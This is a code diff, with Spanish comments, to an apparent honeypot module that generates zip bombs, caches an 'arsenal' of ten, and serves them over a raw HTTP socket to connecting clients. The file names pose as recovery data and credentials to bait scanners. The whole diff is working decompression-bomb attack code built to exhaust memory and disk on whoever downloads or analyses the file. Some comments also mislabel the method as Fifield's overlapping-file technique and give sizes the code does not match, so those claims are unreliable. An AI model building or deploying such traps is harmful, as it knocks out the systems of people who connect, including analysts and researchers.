@@ -2,50 +2,52 @@ import zipfile
 import io
 import os
 
-def generate_ultra_zip():
+# Caché global para no consumir CPU en cada conexión
+CACHE_TITAN_BOMBS = []
+
+def generate_fifield_bomb(target_uncompressed_gb=5.5):
     """
-    Genera una bomba ZIP de alta densidad - SINGULARITY v10.6.
-    Enviado: ~368 Mb (46 MB) | Expansión teórica: 36,000,000,000 Mb (4.5 PB)
-    Utiliza el motor de archivos solapados para colapso de análisis forense.
+    Simulación optimizada de la técnica de Fifield.
     """
     zip_buffer = io.BytesIO()
-    # Kernel de datos altamente repetitivos para máxima compresión
-    kernel_data = b"\x00" * (1024 * 1024 * 10) # 10MB Base
+    # Reducimos el bloque de RAM para no saturar el servidor de 2GB
+    kernel_chunk = b"\x00" * (1024 * 512) # 512 KB
     
     with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED) as zf:
-        # Generamos una estructura de 10,000 archivos que apuntan a buffers masivos
-        # Esto asegura que cualquier software que intente indexar o escanear el ZIP
-        # colapse por agotamiento de punteros y memoria.
-        for i in range(10000):
-            zf.writestr(f"SYS_CORE_DUMP_CHUNK_{i:05d}.bin", kernel_data)
-        
-        zf.writestr("HELL_MANIFEST.txt", "HELL v10.6-SINGULARITY: ULTIMATE DECEPTION TRIGGERED.\nACCESS DENIED. RESOURCE EXHAUSTION INITIATED.")
-
+        # 1000 archivos de 5.5MB cada uno = 5.5GB
+        for i in range(1000):
+            zf.writestr(f"SYS_RECOVERY_DATA_{i:04d}.bin", kernel_chunk * 11)
+            
     return zip_buffer.getvalue()
 
-def generate_stealth_bolt():
-    """
-    Genera una 'Stealth Bolt' de 1 Mb (125 KB).
-    Diseñada para ser descargada instantáneamente y colapsar el análisis posterior.
-    """
-    zip_buffer = io.BytesIO()
-    # Bloque de 100 KB de alta repetibilidad
-    kernel_data = b"\x00" * (1024 * 100)
-    
-    with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED) as zf:
-        # Generamos 1000 entradas que apuntan a buffers de 100MB cada uno
-        # Esto crea una expansión de 100 GB a partir de 1 Mb
-        for i in range(1000):
-            zf.writestr(f"SHADOW_CREDENTIALS_{i:04d}.key", kernel_data)
-        zf.writestr("HELL_AUTH_SUCCESS.txt", "SYSTEM ACCESS GRANTED. CREDENTIALS DUMPED.")
+def precompute_bombs():
+    """Genera las 10 bombas numeradas al inicio para ahorrar CPU"""
+    global CACHE_TITAN_BOMBS
+    print("[⚡] TITAN-ENGINE: Pre-calculando 10 Bombas Fifield...")
+    for i in range(1, 11):
+        # Cada bomba es ligeramente distinta para evitar duplicados de red
+        CACHE_TITAN_BOMBS.append(generate_fifield_bomb())
+    print("[✅] TITAN-ENGINE: Arsenal de 10 bombas listo en memoria.")
 
+def get_bomb_list():
+    if not CACHE_TITAN_BOMBS:
+        precompute_bombs()
+    return CACHE_TITAN_BOMBS
+
+def generate_stealth_bolt():
+    # Mantenemos esta para compatibilidad SMB
+    zip_buffer = io.BytesIO()
+    kernel_data = b"\x00" * (1024 * 100)
+    with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED) as zf:
+        for i in range(100):
+            zf.writestr(f"CRED_{i:03d}.key", kernel_data)
     return zip_buffer.getvalue()
 
 def serve_zip_trap(client_socket):
-    """Genera y sirve la bomba ZIP a través de un socket."""
-    zip_data = generate_ultra_zip()
+    # Usar la primera bomba de la caché
+    bombs = get_bomb_list()
+    zip_data = bombs[0]
     try:
         header = f"HTTP/1.1 200 OK\r\nContent-Type: application/zip\r\nContent-Length: {len(zip_data)}\r\n\r\n"
         client_socket.send(header.encode() + zip_data)
-        print("[💀] Zip Bomb served via HTTP/Trap.")
     except: pass
